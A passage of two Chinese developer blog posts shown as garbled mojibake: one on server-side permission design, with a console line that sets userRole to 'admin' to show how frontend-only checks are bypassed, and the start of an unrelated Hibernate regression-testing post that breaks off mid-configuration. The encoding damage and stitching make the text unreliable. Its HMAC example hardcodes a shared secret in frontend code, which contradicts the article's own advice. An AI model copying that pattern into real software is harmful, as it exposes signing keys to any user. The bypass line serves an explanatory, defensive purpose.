<p>ç„¶è€Œï¼Œè®¸å¤šå¼€å‘è€…åªåœ¨å‰ç«¯é…ç½®æƒé™é€»è¾‘ï¼Œå¿½ç•¥äº† <strong>åç¼–è¯‘ä¸å‰ç«¯æºç æš´éœ²çš„å®‰å…¨é£é™©</strong>ã€‚é€šè¿‡ F12 è°ƒè¯•ã€æ‰“åŒ…åç¼–è¯‘æˆ–ç½‘ç»œæŠ“åŒ…ç­‰æ‰‹æ®µï¼Œæ”»å‡»è€…å¯ä»¥è½»æ˜“ç»•è¿‡å‰ç«¯åˆ¤æ–­ç›´æ¥è®¿é—®åç«¯æ¥å£ã€‚</p>
<blockquote>
<p><strong>é—®é¢˜ï¼š</strong> å¦‚ä½•åœ¨ã€Œæºç å¯è§ã€ã€Œåç¼–è¯‘å¯è¡Œã€çš„ç¯å¢ƒä¸‹ï¼Œè®¾è®¡ä¸€å¥—çœŸæ­£å®‰å…¨ä¸”å¯æ‰©å±•çš„æƒé™ä½“ç³»ï¼Ÿ</p>
</blockquote>
<p>æœ¬æ–‡å°†ä» <strong>Web å®‰å…¨è§†è§’</strong> åˆ†ææƒé™è®¾è®¡çš„åº•å±‚é£é™©ï¼Œè®²è§£ <strong>ä»å‰ç«¯åˆ°åç«¯çš„ç»Ÿä¸€æƒé™é˜²æŠ¤ç­–ç•¥</strong>ï¼Œå¹¶é€šè¿‡ç¤ºä¾‹ä»£ç å±•ç¤ºå¦‚ä½•æœ‰æ•ˆæŠµå¾¡åç¼–è¯‘å¸¦æ¥çš„å®‰å…¨å¨èƒã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€é—®é¢˜å®šä¹‰ä¸èƒŒæ™¯</h2>
<h3 data-id="heading-2">1. å‰ç«¯å¯é€†å‘çš„ç°å®</h3>
<p>ç°ä»£ Web å‰ç«¯ï¼ˆå¦‚ Reactã€Vueã€Angularï¼‰ä½¿ç”¨ <strong>æ‰“åŒ…ç¼–è¯‘</strong> ä¸ <strong>ä»£ç æ··æ·†</strong> æŠ€æœ¯ï¼Œä½†æœ¬è´¨ä¸Šä»æ˜¯ <strong>è¿è¡Œåœ¨ç”¨æˆ·ç«¯çš„å¯æ‰§è¡Œè„šæœ¬</strong>ã€‚æ”»å‡»è€…å¯é€šè¿‡ï¼š</p>
<ul>
<li>æµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹æºç ï¼ˆå³ä½¿æ··æ·†ï¼‰ï¼›</li>
<li>æŠ“åŒ…å·¥å…·ï¼ˆå¦‚ Burpã€Postmanï¼‰ç›´æ¥æ¨¡æ‹Ÿè¯·æ±‚ï¼›</li>
<li>åç¼–è¯‘ WebAssembly / å‰ç«¯åŠ å¯†é€»è¾‘ï¼›</li>
<li>ä¿®æ”¹æœ¬åœ°å­˜å‚¨ä¿¡æ¯ï¼ˆtokenã€roleã€flagï¼‰ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ <strong>ä»»ä½•å‰ç«¯å±‚çš„æƒé™æ ¡éªŒéƒ½æ˜¯ä¸å¯ä¿¡çš„</strong>ã€‚</p>
<h3 data-id="heading-3">2. å¸¸è§é”™è¯¯ç¤ºä¾‹</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// âŒ å‰ç«¯ä¸­é”™è¯¯çš„â€œæƒé™æ§åˆ¶â€</span>
if (userRole === 'admin') {
  <span class="hljs-built_in">showAdminPanel</span>();
} else {
  <span class="hljs-built_in">hideAdminPanel</span>();
}
</code></pre>
<p>æ”»å‡»è€…åªéœ€åœ¨æµè§ˆå™¨æ§åˆ¶å°è¾“å…¥ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">userRole</span> = <span class="hljs-string">'admin'</span><span class="hljs-comment">; showAdminPanel();</span>
</code></pre>
<p>å³å¯ä¼ªè£…ä¸ºç®¡ç†å‘˜ã€‚</p>
<hr/>
<h2 data-id="heading-4">äºŒã€è§£å†³æ–¹æ¡ˆä¸æŠ€æœ¯è®¾è®¡</h2>
<h3 data-id="heading-5">ğŸ”’ æƒé™æ§åˆ¶çš„æœ¬è´¨ï¼šå¯ä¿¡åˆ¤å®šå¿…é¡»åœ¨æœåŠ¡ç«¯</h3>
<p>å®‰å…¨è®¾è®¡åŸåˆ™ï¼š</p>
<blockquote>
<p><strong>ä»»ä½•å®‰å…¨ç›¸å…³çš„åˆ¤æ–­éƒ½åº”åœ¨æœåŠ¡ç«¯å®Œæˆï¼Œå‰ç«¯ä»…ä½œå±•ç¤ºæˆ–å¼•å¯¼ã€‚</strong></p>
</blockquote>
<h3 data-id="heading-6">1. åç«¯ç»Ÿä¸€é‰´æƒä¸æˆæƒ</h3>
<p>åç«¯éœ€è¦æ„å»ºä¸€å¥—é›†ä¸­å¼çš„ <strong>é‰´æƒï¼ˆAuthenticationï¼‰</strong> ä¸ <strong>æˆæƒï¼ˆAuthorizationï¼‰</strong> æ¨¡å‹ï¼š</p>
<ul>
<li><strong>é‰´æƒï¼š</strong> å½“å‰è¯·æ±‚æ˜¯è°ï¼Ÿï¼ˆJWT / Session / OAuth2ï¼‰</li>
<li><strong>æˆæƒï¼š</strong> å½“å‰ç”¨æˆ·èƒ½åšä»€ä¹ˆï¼Ÿï¼ˆRBAC / ABAC / PBACï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šåŸºäº RBAC çš„ Spring Boot åç«¯å®ç°</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// RoleBasedAccess.javaï¼ˆè‡ªå®šä¹‰æ³¨è§£ï¼‰</span>
<span class="hljs-variable">@Target</span>(ElementType.METHOD)
<span class="hljs-variable">@Retention</span>(RetentionPolicy.RUNTIME)
public <span class="hljs-variable">@interface</span> RoleBasedAccess {
    <span class="hljs-selector-tag">String</span><span class="hljs-selector-attr">[]</span> <span class="hljs-selector-tag">value</span>();
}
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// SecurityInterceptor.java</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res, Object handler)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">"Authorization"</span>);
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> TokenUtils.verify(token);
        <span class="hljs-type">RoleBasedAccess</span> <span class="hljs-variable">access</span> <span class="hljs-operator">=</span> ((HandlerMethod) handler).getMethodAnnotation(RoleBasedAccess.class);
        <span class="hljs-keyword">if</span> (access != <span class="hljs-literal">null</span> &amp;&amp; !user.hasAnyRole(access.value())) {
            res.setStatus(HttpServletResponse.SC_FORBIDDEN);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// æ§åˆ¶å™¨ç¤ºä¾‹</span>
<span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/admin/list"</span>)
<span class="hljs-variable">@RoleBasedAccess</span>({<span class="hljs-string">"ADMIN"</span>})
public ResponseEntity&lt;?&gt; <span class="hljs-built_in">listAdmins</span>() {
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(adminService.<span class="hljs-built_in">findAll</span>());
}
</code></pre>
<blockquote>
<p>âœ… å³ä½¿æ”»å‡»è€…ç¯¡æ”¹å‰ç«¯å˜é‡æˆ–ä¿®æ”¹ UIï¼Œä»æ— æ³•è®¿é—®æœªç»æˆæƒçš„æ¥å£ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">2. å‰ç«¯ä»…ä½œâ€œæƒé™å¯è§†åŒ–â€ï¼Œéâ€œæƒé™æ§åˆ¶â€</h3>
<p>å‰ç«¯å¯ä»¥æŒ‰æœåŠ¡å™¨è¿”å›çš„æƒé™æ ‡è¯†åŠ¨æ€æ¸²æŸ“æŒ‰é’®ã€èœå•ï¼Œä½†<strong>ä¸èƒ½</strong>ä¾èµ–è¿™äº›å­—æ®µåšä¸šåŠ¡å®‰å…¨åˆ¤æ–­ã€‚</p>
<p><strong>å‰ç«¯ç¤ºä¾‹ï¼ˆVue + Axiosï¼‰</strong></p>
<pre><code class="hljs language-ini" lang="ini">// app.js
axios.interceptors.request.use(<span class="hljs-attr">config</span> =&gt; {
  const <span class="hljs-attr">token</span> = localStorage.getItem(<span class="hljs-string">'token'</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">config.headers.Authorization</span> = token<span class="hljs-comment">;</span>
  return config<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>

// åŠ¨æ€èœå•æ¸²æŸ“
const <span class="hljs-attr">user</span> = getUserInfo()<span class="hljs-comment">; // åç«¯è¿”å›çš„è§’è‰²ä¿¡æ¯</span>
const <span class="hljs-attr">routes</span> = allRoutes.filter(route =&gt; user.roles.includes(route.meta.role))<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>èœå•ä¸æŒ‰é’®çš„å±•ç¤ºåªå½±å“â€œè§†è§‰ä½“éªŒâ€ï¼›</li>
<li>å®é™…çš„è®¿é—®ç»“æœç”±åç«¯å†³å®šï¼ˆå³ä½¿å‰ç«¯æŒ‰é’®è¢«ä¼ªé€ ä¹Ÿæ— æ•ˆï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-8">3. é˜²åç¼–è¯‘ä¸æ•°æ®æš´éœ²çš„åŠ å›ºæªæ–½</h3>



































<table><thead><tr><th>å¨èƒç±»å‹</th><th>é˜²æŠ¤ç­–ç•¥</th><th>æŠ€æœ¯ç‚¹</th></tr></thead><tbody><tr><td>æºç åç¼–è¯‘</td><td>æ„å»ºæ—¶æ··æ·†ä¸ Tree Shaking</td><td>Webpack <code>terser</code> / <code>esbuild</code></td></tr><tr><td>å…³é”®é€»è¾‘é€†å‘</td><td>å°†æ ¸å¿ƒç®—æ³•è¿ç§»è‡³åç«¯æˆ– WebAssembly</td><td>ä¾‹å¦‚ç­¾åã€å¯†é’¥ç”Ÿæˆ</td></tr><tr><td>API è¢«ç›´æ¥è°ƒç”¨</td><td>ä½¿ç”¨ Token + HMAC ç­¾å + é™æµ</td><td>JWT + Redis + Nginx</td></tr><tr><td>è°ƒè¯•æ³¨å…¥</td><td>CSPï¼ˆContent Security Policyï¼‰é™åˆ¶ JS æ‰§è¡Œç¯å¢ƒ</td><td>HTTP å®‰å…¨å¤´</td></tr><tr><td>æ•°æ®æ³„æ¼</td><td>åç«¯ç™½åå•è¿‡æ»¤ã€æ•æ„Ÿå­—æ®µè„±æ•</td><td>DTO é˜²æ­¢ DB å­—æ®µé€ä¼ </td></tr></tbody></table>
<p>ä¾‹å¦‚ï¼Œé€šè¿‡ <strong>è¯·æ±‚ç­¾åæœºåˆ¶ï¼ˆHMACï¼‰</strong> é˜»æ­¢ä¼ªé€ è¯·æ±‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// å‰ç«¯å‘èµ·è¯·æ±‚å‰ç”Ÿæˆç­¾åï¼ˆæ‰€æœ‰å‚æ•° + æ—¶é—´æˆ³ï¼‰
import crypto from "crypto"<span class="hljs-comment">;</span>

const <span class="hljs-attr">secret</span> = <span class="hljs-string">"server-shared-key"</span><span class="hljs-comment">;</span>
const <span class="hljs-attr">timestamp</span> = Date.now().toString()<span class="hljs-comment">;</span>
const <span class="hljs-attr">sign</span> = crypto.createHmac(<span class="hljs-string">'sha256'</span>, secret)
                   .update(userId + timestamp)
                   .digest('hex')<span class="hljs-comment">;</span>

axios.post('/api/secure', { data, timestamp, sign })<span class="hljs-comment">;</span>
</code></pre>
<p>åç«¯éªŒè¯ç­¾ååˆæ³•æ€§ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Flask ç¤ºä¾‹</span>
<span class="hljs-keyword">import</span> hmac, hashlib

<span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_sign</span>(<span class="hljs-params">userId, ts, sign</span>):
    secret = <span class="hljs-string">"server-shared-key"</span>
    expected = hmac.new(secret.encode(), <span class="hljs-string">f"<span class="hljs-subst">{userId}</span><span class="hljs-subst">{ts}</span>"</span>.encode(), hashlib.sha256).hexdigest()
    <span class="hljs-keyword">return</span> hmac.compare_digest(expected, sign)
</code></pre>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€ä¼˜ç¼ºç‚¹åˆ†æä¸å®è·µå»ºè®®</h2>





























<table><thead><tr><th>æ¨¡å‹</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>å‰ç«¯æƒé™ï¼ˆå±•ç¤ºçº§ï¼‰</td><td>å“åº”å¿«ã€æ˜“å®ç°</td><td>ç®€å•æ˜“è¢«ç»•è¿‡</td><td>UIæ§åˆ¶ã€ä½å®‰å…¨é¡µé¢</td></tr><tr><td>åç«¯æƒé™ï¼ˆéªŒè¯çº§ï¼‰</td><td>å®‰å…¨å¯é ã€å¯å®¡è®¡</td><td>å¼€å‘ç•¥å¤æ‚</td><td>æ‰€æœ‰æ•æ„Ÿæ¥å£å¿…é¡»</td></tr><tr><td>æ··åˆç­–ç•¥</td><td>å®‰å…¨+ä½“éªŒå¹³è¡¡</td><td>éœ€å‰åç«¯ç‰ˆæœ¬ç»Ÿä¸€</td><td>ä¼ä¸šåå°ä¸­å¤§å‹ç³»ç»Ÿ</td></tr></tbody></table>
<p><strong>å®è·µå»ºè®®ï¼š</strong></p>
<ol>
<li><strong>å‰ç«¯è´Ÿè´£ä½“éªŒ</strong>ï¼Œä½†ä¸è¦æ‰¿æ‹…å®‰å…¨èŒè´£ï¼›</li>
<li><strong>åç«¯è´Ÿè´£æƒé™æ ¸å¿ƒ</strong>ï¼Œæ‰€æœ‰è¯·æ±‚å‡äºŒæ¬¡æ ¡éªŒï¼›</li>
<li>å¯¹<strong>é™æ€èµ„æºä¸æ¥å£</strong>åŒæ—¶é™æµã€æ ¡éªŒã€å®¡è®¡ï¼›</li>
<li>æ¯ä¸ªæƒé™ç‚¹åº”<strong>æœ‰æ—¥å¿—å¯è¿½æº¯ã€æœ‰ç­–ç•¥å¯ç®¡ç†</strong>ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-10">å››ã€ç»“è®º</h2>
<p>åœ¨åç¼–è¯‘ä¸æºç æš´éœ²æˆä¸ºå¸¸æ€çš„ Web ç¯å¢ƒä¸­ï¼Œ<strong>å‰ç«¯å®‰å…¨åªæ˜¯å¹»è§‰ï¼Œåç«¯çš„æƒé™æ‰æ˜¯çœŸç›¸</strong>ã€‚</p>
<p>é«˜è´¨é‡çš„æƒé™è®¾è®¡ï¼Œä¸æ˜¯è®©å‰ç«¯æ›´â€œèªæ˜â€ï¼Œè€Œæ˜¯è®©åç«¯æ›´â€œå¯ä¿¡â€ï¼›ä¸æ˜¯é æ··æ·†éšè—é€»è¾‘ï¼Œè€Œæ˜¯é æ¶æ„å»ºç«‹ä¿¡ä»»è¾¹ç•Œã€‚</p>
<p>æœªæ¥ï¼Œéšç€ <strong>é›¶ä¿¡ä»»æ¶æ„ï¼ˆZero Trustï¼‰</strong> ä¸ <strong>å‰åç«¯ä¸€ä½“åŒ–åŠ å¯†é€šä¿¡</strong> çš„æ™®åŠï¼Œ<br/>
æƒé™è®¾è®¡å°†æ›´æ™ºèƒ½ã€æ›´å»ä¸­å¿ƒåŒ–ï¼ŒåŸºäº <strong>èº«ä»½ã€ä¸Šä¸‹æ–‡ä¸è¡Œä¸ºæ£€æµ‹</strong> çš„åŠ¨æ€æˆæƒæœºåˆ¶å°†é€æ¸å–ä»£ä¼ ç»Ÿ RBACã€‚</p>
<hr/>
<h2 data-id="heading-11">äº”ã€å‚è€ƒèµ„æ–™</h2>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fowasp.org%2FTop10%2FA01_2021-Broken_Access_Control%2F" target="_blank" title="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" ref="nofollow noopener noreferrer">OWASP Top 10 2021 â€“ A01: Broken Access Control</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fspring.io%2Fprojects%2Fspring-security" target="_blank" title="https://spring.io/projects/spring-security" ref="nofollow noopener noreferrer">Spring Security å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FCSP" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" ref="nofollow noopener noreferrer">MDN â€“ Content Security Policy (CSP) æŒ‡å—</a></li>
<li>[JWT.io â€“ JSON Web Token å®˜æ–¹æ ‡å‡†]</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FAuthorization_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP â€“ Authorization Cheat Sheet</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ91ï¼‰å¦‚ä½•åœ¨æ•°æ®åº“å›å½’æµ‹è¯•ä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7603649945978617875</link>    <guid>https://juejin.cn/post/7603649945978617875</guid>    <pubDate>2026-02-07T23:16:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603649945978617875" data-draft-id="7603644943351316486" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ91ï¼‰å¦‚ä½•åœ¨æ•°æ®åº“å›å½’æµ‹è¯•ä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-07T23:16:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ91ï¼‰å¦‚ä½•åœ¨æ•°æ®åº“å›å½’æµ‹è¯•ä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-07T23:16:11.000Z" title="Sat Feb 07 2026 23:16:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ•°æ®åº“å›å½’æµ‹è¯•ç”¨æ¥ç¡®ä¿å¯¹æ•°æ®åº“çš„æ›´æ”¹ä¸ä¼šç ´åç°æœ‰åŠŸèƒ½ã€‚è¿™å¯ä»¥åŒ…æ‹¬éªŒè¯æ’å…¥ã€æ›´æ–°ã€åˆ é™¤æ“ä½œä»¥åŠé«˜çº§æŸ¥è¯¢ç­‰ã€‚ä½¿ç”¨Hibernateè¿›è¡Œæ•°æ®åº“å›å½’æµ‹è¯•ï¼Œå¯ä»¥ç¡®ä¿ORMå±‚çš„æ­£ç¡®æ€§ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªè¯¦ç»†çš„ç¤ºä¾‹ï¼Œç»“åˆä»£ç è®²è§£å¦‚ä½•åœ¨æ•°æ®åº“å›å½’æµ‹è¯•ä¸­ä½¿ç”¨Hibernateï¼ŒåŒ…æ‹¬æ•°æ®åº“é…ç½®ã€ç¼–å†™å®ä½“ç±»ã€è®¾ç½®æ•°æ®è®¿é—®å¯¹è±¡ (DAO)ã€ç¼–å†™å›å½’æµ‹è¯•è„šæœ¬ã€‚</p>
<h3 data-id="heading-0">å‰ææ¡ä»¶</h3>
<ul>
<li>ä½¿ç”¨MySQLä½œä¸ºæ•°æ®åº“ã€‚</li>
<li>ä½¿ç”¨Gradleä½œä¸ºæ„å»ºå·¥å…·ã€‚</li>
<li>ä½¿ç”¨JUnitè¿›è¡Œå›å½’æµ‹è¯•ã€‚</li>
<li>ä½¿ç”¨Hibernateè¿›è¡ŒORMæ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-1">1. è®¾ç½®Hibernateé…ç½®</h3>
<p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªHibernateé…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code>ï¼Œç”¨äºè¿æ¥æ•°æ®åº“ã€‚</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/regression_test_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>db_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>db_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
